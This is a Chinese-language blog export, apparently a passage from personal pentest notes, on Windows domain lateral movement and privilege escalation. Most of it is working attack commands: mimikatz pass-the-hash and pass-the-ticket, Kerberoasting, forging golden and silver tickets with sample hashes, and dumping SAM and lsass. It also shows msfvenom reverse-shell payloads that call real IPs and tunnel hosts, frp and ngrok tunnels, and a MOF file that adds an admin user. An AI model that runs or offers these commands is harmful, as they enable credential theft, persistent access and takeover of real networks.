<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 生成票据</span><br><span class="line">kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br><span class="line"># 导入票据</span><br><span class="line">kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi</span><br><span class="line"># 查看凭证</span><br><span class="line">klist</span><br><span class="line"># 利用 net use 载入</span><br><span class="line">dir \\OWA20210CN-God.god.org\c$</span><br></pre></td></tr></table></figure>



<h1 id="域横向-SPN-amp-RDP"><a href="#域横向-SPN-amp-RDP" class="headerlink" title="域横向 SPN&amp;RDP"></a>域横向 SPN&amp;RDP</h1><h2 id="域横向移动RDP传递-Mimikatz"><a href="#域横向移动RDP传递-Mimikatz" class="headerlink" title="域横向移动RDP传递-Mimikatz"></a>域横向移动RDP传递-Mimikatz</h2><p>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作RDP协议连接:判断对方远程桌面服务是否开启(默认:3389)，端口扫描判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RDP明文密码连接</span><br><span class="line">windows:</span><br><span class="line">mstsc</span><br><span class="line">mstsc.exe /console /v:192.168.3.21 /admin</span><br><span class="line">Linux:</span><br><span class="line">rdesktop 192.168.3.21:3389</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RDP密文Hash链接</span><br><span class="line">windows server需要开启Resticted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7和Windows Server2008 R2安装了2871997、2973351补丁也支持;开启命令:</span><br><span class="line"></span><br><span class="line">REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启后运行</span><br><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 “/run:mstsc.exe /restrictedadmin”</span><br></pre></td></tr></table></figure>



<h2 id="域横向移动SPN服务-探针-请求-破解-重写"><a href="#域横向移动SPN服务-探针-请求-破解-重写" class="headerlink" title="域横向移动SPN服务-探针,请求,破解,重写"></a>域横向移动SPN服务-探针,请求,破解,重写</h2><p>黑客可以使用有效的域用户的身份验证票证（TGT)）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RCA_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerhernat攻和间击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探针</span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -q */* | findstr &quot;MSSQL&quot;</span><br><span class="line">请求</span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;</span><br><span class="line">mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</span><br><span class="line">导出</span><br><span class="line">mimikatz.exe &quot;kerberos::list /export&quot;</span><br><span class="line">破解</span><br><span class="line">python tgsrepcrack.py passwd.txt xxxx.kirbi</span><br><span class="line">python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br><span class="line">重写</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</span><br></pre></td></tr></table></figure>



<h1 id="域横向内网漫游Socks代理隧道技术"><a href="#域横向内网漫游Socks代理隧道技术" class="headerlink" title="域横向内网漫游Socks代理隧道技术"></a>域横向内网漫游Socks代理隧道技术</h1><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220324181713883-1648902585363.png" alt="image-20220324181713883"></p>
<p>1.内外网简单知识<br>2.内网1和内网2通信问题<br>3.正向反向协议通信连接问题<br>控制端连接被控制端为正向<br>4.内网穿透代理隧道技术说明</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png" alt="image.png"></p>
<h2 id="内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="内网穿透Ngrok测试演示-两个内网通讯上线"></a>内网穿透Ngrok测试演示-两个内网通讯上线</h2><p>Linux是控制端，运行ngrok里的sunny，然后用木马生成器msfvenom监听xiaodisec.free.idcfengye.com，监听以后</p>
<p>配置控制端的ip和端口即可成功监听。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.注册-购买-填写-确认</span><br><span class="line">http://www.ngrok.cc/</span><br><span class="line">https://www.natfrp.com/</span><br><span class="line">协议: http本地端口:192.168.76.132:4444</span><br><span class="line">⒉.测试:内网1执行后门-免费主机处理-内网2监听-内网2接受器</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./sunny clientid aa0676878c162ffc</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.76.132</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>



<h2 id="内网穿透Frp自建跳板测试-两个内网通讯上线"><a href="#内网穿透Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="内网穿透Frp自建跳板测试-两个内网通讯上线"></a>内网穿透Frp自建跳板测试-两个内网通讯上线</h2><p>自行搭建的，方便修改，成本低，使用多样化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#服务端</span><br><span class="line">1.服务端</span><br><span class="line">修改frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 6677</span><br><span class="line">2.启动服务器</span><br><span class="line">chmod 755 frps(获取权限)</span><br><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#控制端</span><br><span class="line">1.控制端修改</span><br><span class="line">修改frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 你的云主机 ip</span><br><span class="line">server_port = 6677 #frpc 工作端口，必须和上面 frps 保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1a</span><br><span class="line">local_port = 5555 #转发给本机的 5555</span><br><span class="line">remote_port = 6000 #服务端用 6000 端口转发给本机</span><br><span class="line">2.启动客户端</span><br><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成后门</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.160.211 lport=6000 -f exe -o frp.exe</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">靶机运行frp.exe文件即可</span><br></pre></td></tr></table></figure>



<h1 id="域横向CS-amp-MSF-联动及应急响初识"><a href="#域横向CS-amp-MSF-联动及应急响初识" class="headerlink" title="域横向CS&amp;MSF 联动及应急响初识"></a>域横向CS&amp;MSF 联动及应急响初识</h1><h2 id="MSF-amp-CobaltStrike联动Shell"><a href="#MSF-amp-CobaltStrike联动Shell" class="headerlink" title="MSF&amp;CobaltStrike联动Shell"></a>MSF&amp;CobaltStrike联动Shell</h2><p>CS-&gt;MSF<br>创建Foreign监听器<br>MSF监听模块设置对应端口地址CS执行Spawn选择监听器</p>
<p>MSF-&gt;CS<br>CS创建监听器<br>MSF载入新模块注入设置对应地址端口执行CS等待上线<br>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="1-IPC横向移动"><a href="#1-IPC横向移动" class="headerlink" title="1.IPC横向移动"></a>1.IPC横向移动</h2><ol>
<li><p>条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">139、445开放</span><br><span class="line">管理员开启了默认共享</span><br></pre></td></tr></table></figure>
</li>
<li><p>建立IPC命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\ip\ipc$&quot;密码&quot;/user:用户名</span><br></pre></td></tr></table></figure>
</li>
<li><p>常见错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">错误号5:拒绝访问。</span><br><span class="line">错误号51: Windows 无法找到网络路径,即网络络中存在问题</span><br><span class="line">错误号53:找不到网络路径，包括IP地址错误、目标未开机,目标的 lanmanserver服务未启动、目标有防火墙（端口过滤)。</span><br><span class="line">错误号67:找不到网络名，包括 lanmanworkstation服务未启动、ipc$ 已被删除。</span><br><span class="line">错误号1219:提供的凭据与已存在的凭据集冲突。例如,已经和目标建立了ipc$,需要在删除原连接后重新进行连接。</span><br><span class="line">错误号1326:未知的用户名或错误的密码。</span><br><span class="line">错误号1792:试图登录，但是网络登录服务器没有启动，包括目标NetLogon服务未启动（连接域控制器时会出现此情况)</span><br><span class="line">错误号2242:此用户的密码已过期。例如目标机器设置了账号管理策略，强制用户定期修改密码。</span><br></pre></td></tr></table></figure>
</li>
<li><p>IPC交互</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.dir\\10.10.3.6\c$(列出主机文件)</span><br><span class="line">2.tasklist /S 10.10.3.6 /U xiyou1\administrator /P QWEasd1234（进程枚举）</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="2-计划任务横向移动"><a href="#2-计划任务横向移动" class="headerlink" title="2.计划任务横向移动"></a>2.计划任务横向移动</h2><h2 id="3-Windows系统散列值获取分析"><a href="#3-Windows系统散列值获取分析" class="headerlink" title="3.Windows系统散列值获取分析"></a>3.Windows系统散列值获取分析</h2><ol>
<li><p>LM Hash和 NTLM Hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windowus 操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在ntds.dit中进行加密后为散列值。Widows操作系统中的密码一般由两部分组成，一部分为LM Hash，另部分为NTLM Hash。</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="4-Mimikatz枚举NTLM-hash"><a href="#4-Mimikatz枚举NTLM-hash" class="headerlink" title="4.Mimikatz枚举NTLM hash"></a>4.Mimikatz枚举NTLM hash</h2><h3 id="通过SAM和System文件抓取密码"><a href="#通过SAM和System文件抓取密码" class="headerlink" title="通过SAM和System文件抓取密码"></a>通过SAM和System文件抓取密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive    #通过reg的save选项将注册表中的SAM,System文件导出到本地磁盘</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426447_60867c8fe216c15746570.png!small" alt="1619426447_60867c8fe216c15746570.png!small?1619426448334"></p>
<h3 id="通过读取SAM和System文件获取NTML-Hash"><a href="#通过读取SAM和System文件获取NTML-Hash" class="headerlink" title="通过读取SAM和System文件获取NTML Hash"></a>通过读取SAM和System文件获取NTML Hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive    #文件和mimikatz放在同一目录</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426455_60867c97e96a2a6198ef7.png!small" alt="1619426455_60867c97e96a2a6198ef7.png!small?1619426457174"></p>
<h3 id="Mimikatz读取SAM"><a href="#Mimikatz读取SAM" class="headerlink" title="Mimikatz读取SAM"></a>Mimikatz读取SAM</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">privilege::debug    #提升权限</span><br><span class="line">token::elevate    #system权限</span><br><span class="line">lsadump::sam    #读取本地SAM文件，获取NTML Hash</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426466_60867ca238d655b2c033f.png!small" alt="1619426466_60867ca238d655b2c033f.png!small?1619426467936"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">log</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>



<h2 id="5-mimikatz免杀方法"><a href="#5-mimikatz免杀方法" class="headerlink" title="5.mimikatz免杀方法"></a>5.mimikatz免杀方法</h2><ol>
<li><p>Procdump+Mimikatz配合获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prodump导出lsass.dmp文件</span><br><span class="line">使用mimikatz导出文件中的密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="6-黄金票据利用"><a href="#6-黄金票据利用" class="headerlink" title="6.黄金票据利用"></a>6.黄金票据利用</h2><ol>
<li><p>简介</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Kerberos认证中，Client通过AS（身份认证服务）认证后，AS会给Client一个Logon Session Key和TGT，而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的，所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后，就跳过AS验证，不用验证账户和密码，所以也不担心域管密码修改</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.伪造的域管理员用户名</span><br><span class="line">2.完整的域名</span><br><span class="line">3.域SID</span><br><span class="line">4.krbtgt的NTLM Hash</span><br></pre></td></tr></table></figure>
</li>
<li><p>信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge #windows命令行下清除票据</span><br><span class="line">net config workstation #获取域名信息</span><br><span class="line">nltest /dsgetdc:域名 #获取主机名</span><br><span class="line">mimikatz导出用户krbtgt的hash</span><br><span class="line">wmic useraccount get name,sid #获取krbtgt的SID值</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用mimikatz生成金票生成.kirbi文件进行保存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:systest /domain:xiyou.dayu.com /sid:S-1-5-21-1816246241-4074331134-2257350442 /krbtgt:39601ebdad1d3e960ed3712398d3ab3a /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名（任意）</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称    //不是写入内存中的命令！</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用票据</p>
<ol>
<li><p>登录域内普通用户，mimikatz中的kerberos::ptt功能将ticket.kirbi导入内存中：成功导入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证金票</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
</li>
<li><p>&#96;&#96;&#96;<br>dir \xiyou.xiyou.dayu.com\c$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">6. 命令执行成功！成功访问，直接通过上期技术建立计划任务即可！</span><br><span class="line"></span><br><span class="line">## 7.白银票据利用</span><br><span class="line"></span><br><span class="line">1. 简介</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么白银票据就是伪造的ST了，在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key解密ST，从而获得Session Key。通过Session Key解密Authenticator3，进而验证对方的身份，验证成功就让Client访问server上的指定服务了。<br>所以我们只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. 攻击条件</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>域名</p>
</li>
<li><p>域SID(test)</p>
</li>
<li><p>目标服务器的FQDN</p>
</li>
<li><p>可利用的服务</p>
</li>
<li><p>服务账号的NTLM Hash</p>
</li>
<li><p>要伪造的用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. 信息搜集</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p>1.获取域名：net config workstation<br>2.获取主机名：nltest &#x2F;dsgetdc:xiyou.dayu.com<br>3.获取域SID：whoami &#x2F;all<br>4.获取NTML Hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">4. 开始攻击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:<NTLM Hash> &#x2F;user:&lt;要伪造的用户名，任意填写&gt; &#x2F;ptt</p>
<p>kerberos::golden &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;target:xiyou.xiyou.dayu.com &#x2F;service:cifs &#x2F;rc4:f5369b5accc878d9eedfcde13578e2fc &#x2F;user:testw &#x2F;ptt</p>
<ol>
<li>&#x2F;domain：域名</li>
<li>&#x2F;sid：域的SID值</li>
<li>&#x2F;target: 域控制器全称即FQDN</li>
<li>&#x2F;service: 需要指定相关的服务名，此处为cifs</li>
<li>&#x2F;rc4: 域控的计算机账户ntlm hash</li>
<li>&#x2F;user: 要伪造的用户名，任意填写<br>&#96;&#96;&#96;</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域内横向</tag>
      </tags>
  </entry>
  <entry>
    <title>权限提升</title>
    <url>/2022/04/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Win-溢出漏洞及-AT-amp-SC-amp-PS-提权"><a href="#Win-溢出漏洞及-AT-amp-SC-amp-PS-提权" class="headerlink" title="Win 溢出漏洞及 AT&amp;SC&amp;PS 提权"></a>Win 溢出漏洞及 AT&amp;SC&amp;PS 提权</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1629882213713-99ae074e-533d-43b9-837d-6ec6c0914f33.png" alt="image.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1629882218746-cf31d52a-379e-4264-aef2-16b5d3ecbd13.png" alt="image.png"></p>
<h2 id="如何判断溢出漏洞？漏洞在哪里找？"><a href="#如何判断溢出漏洞？漏洞在哪里找？" class="headerlink" title="如何判断溢出漏洞？漏洞在哪里找？"></a>如何判断溢出漏洞？漏洞在哪里找？</h2><p>信息搜集-补丁筛选-利用MSF或者特定的EXP-执行-西瓜到手</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vulmap（需要power shell,cmd不行） </span><br><span class="line">Wesng（只需要systeminfo信息，web环境，本地提权都可以） </span><br><span class="line">WindowsVulnScan（跟上边的差不多，需要手工改写utf-8格式）</span><br></pre></td></tr></table></figure>

<p>下载地址：</p>
<p><a href="https://github.com/vulmon/Vulmap">Vulmap</a></p>
<p><a href="https://github.com/bitsadmin/wesng">Wesng</a></p>
<p><a href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan</a></p>
<h2 id="如何判断使用哪种数据库提权-数据库提权利用条件"><a href="#如何判断使用哪种数据库提权-数据库提权利用条件" class="headerlink" title="如何判断使用哪种数据库提权?数据库提权利用条件?"></a>如何判断使用哪种数据库提权?数据库提权利用条件?</h2><p>MSF工具，最好买一个服务器，linux的ubantu，安装msf</p>
<p><a href="https://blog.csdn.net/weixin_43896364/article/details/117676325?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164905029116782089388931%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164905029116782089388931&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-13-117676325.142%5Ev5%5Epc_search_result_control_group,157%5Ev4%5Enew_style&utm_term=%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85msf&spm=1018.2226.3001.4187">msf搭建教程</a></p>
<p>最后msfdb init 记得yes 按照流程弄完即可成功启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=121.4.97.34 LPORT=5566 -f exe -o test.exe（服务器上生成后门）</span><br><span class="line">上传到肉机上，运行，反弹到121.4.97.34的5566端口</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5566</span><br><span class="line">exploit</span><br><span class="line">反弹会话</span><br><span class="line"></span><br><span class="line">search ms16</span><br><span class="line">use 那个模块</span><br><span class="line">set session 3</span><br><span class="line">set payload...</span><br><span class="line">show options</span><br><span class="line">set lhost</span><br><span class="line">set lport</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chcp 65001</span><br><span class="line">2019-1388</span><br><span class="line">sessions -i</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>



<h2 id="如何判断本地环境可利用漏洞情况-AT-amp-SC-amp-PS命令适用环境"><a href="#如何判断本地环境可利用漏洞情况-AT-amp-SC-amp-PS命令适用环境" class="headerlink" title="如何判断本地环境可利用漏洞情况?AT&amp;SC&amp;PS命令适用环境?"></a>如何判断本地环境可利用漏洞情况?AT&amp;SC&amp;PS命令适用环境?</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2020-0787 BitsArbitraryFileMoveExploit</span><br><span class="line"></span><br><span class="line">at 15:13 /interactive cmd.exe</span><br><span class="line"></span><br><span class="line">windows7之前</span><br><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br><span class="line"></span><br><span class="line"># 实测2012 R2成功</span><br><span class="line"># 需要下载微软官网的pstools</span><br><span class="line"># https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure>



<h1 id="MY-amp-MS-amp-ORA-等-SQL-数据库提权"><a href="#MY-amp-MS-amp-ORA-等-SQL-数据库提权" class="headerlink" title="MY&amp;MS&amp;ORA 等 SQL 数据库提权"></a>MY&amp;MS&amp;ORA 等 SQL 数据库提权</h1><p>提权必要条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">具有MySQL的root权限，且MySQL以system权限运行。</span><br><span class="line">具有执行SQL语句的权限。</span><br><span class="line">获取root密码的方法：</span><br></pre></td></tr></table></figure>



<h2 id="Mysql数据库提权演示-脚本-amp-MSF"><a href="#Mysql数据库提权演示-脚本-amp-MSF" class="headerlink" title="Mysql数据库提权演示-脚本&amp;MSF"></a>Mysql数据库提权演示-脚本&amp;MSF</h2><p>流程:服务探针-信息收集-提权利用-获取权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql3306</span><br><span class="line">oracle1521</span><br><span class="line">sqlsever1433</span><br></pre></td></tr></table></figure>

<p>mysql的data文件里MYD文件储存内容</p>
<h3 id="UDF提权知识点（基于mysql调用命令执行函数）"><a href="#UDF提权知识点（基于mysql调用命令执行函数）" class="headerlink" title="UDF提权知识点（基于mysql调用命令执行函数）"></a>UDF提权知识点（基于mysql调用命令执行函数）</h3><p>·读取网站数据库配置文件（了解其命名规则及查找技巧)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql data inc config conn database common include等</span><br></pre></td></tr></table></figure>


<p>·读取数据库存储或备份文件（了解其数据库存储格式及对应内容)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@basedir/data/数据库名/表名.myd</span><br></pre></td></tr></table></figure>

<p>·利用脚本暴力猜解（了解数据库是否支持外联及如何开启外联)·远程本地暴力猜解，服务器本地暴力猜解</p>
<p>·利用自定义执行函数导出dl文件进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">必须有root权限</span><br><span class="line">select version()版本</span><br><span class="line">select @@basedir安装目录</span><br></pre></td></tr></table></figure>

<p>手工创建plugin目录或利用NTFS流创建<br>select ‘x’ into dumpfile ‘目录&#x2F;lib&#x2F;plugin:lNDEX_ALLOCATION”;</p>
<p>1.mysql&lt;5.1导出目录c:&#x2F;windows 或 system32<br>2.mysql&#x3D;&gt;5.1导出安装目录&#x2F;lib&#x2F;plugin&#x2F;</p>
<h3 id="MOF知识点-基于MYSQL特性的安全问题"><a href="#MOF知识点-基于MYSQL特性的安全问题" class="headerlink" title="MOF知识点:(基于MYSQL特性的安全问题)"></a>MOF知识点:(基于MYSQL特性的安全问题)</h3><p>原理</p>
<p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof)叫做”托管对象格式””其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上转的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
<p>过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在可写目录中上传mof文件。</span><br><span class="line">把mof文件上传到`C:/wmpub/nullevt.mof`</span><br><span class="line">把这个文件复制到`C:/Windows/System32/wbem/MOF/nullevt.mof`目录下</span><br><span class="line"></span><br><span class="line">select load_file(&#x27;C:/wmpub/nullevt.mof&#x27;) into dumpfile &#x27;C:/Windows/System32/wbem/MOF/nullevt.mof</span><br></pre></td></tr></table></figure>



<p>将下面这段代码复制到mof后缀的文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pragma namespace(&quot;\.\root\subscription&quot;)</span><br><span class="line">instance of EventFilter as $EventFilter&#123; EventNamespace =&quot;Root\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new</span><br><span class="line">ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="启动项知识点-基于配合操作系统自启动"><a href="#启动项知识点-基于配合操作系统自启动" class="headerlink" title="启动项知识点:(基于配合操作系统自启动)"></a>启动项知识点:(基于配合操作系统自启动)</h3><p>导出自定义可执行文件到启动目录配合重启执行<br>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行!</p>
<h1 id="Win提权方法总结"><a href="#Win提权方法总结" class="headerlink" title="Win提权方法总结"></a>Win提权方法总结</h1><p><img src="D:\blog\githubblog\source\img\1605453393_5fb146513192ec6c15dae.png!small" alt="1605453393_5fb146513192ec6c15dae.png!small"></p>
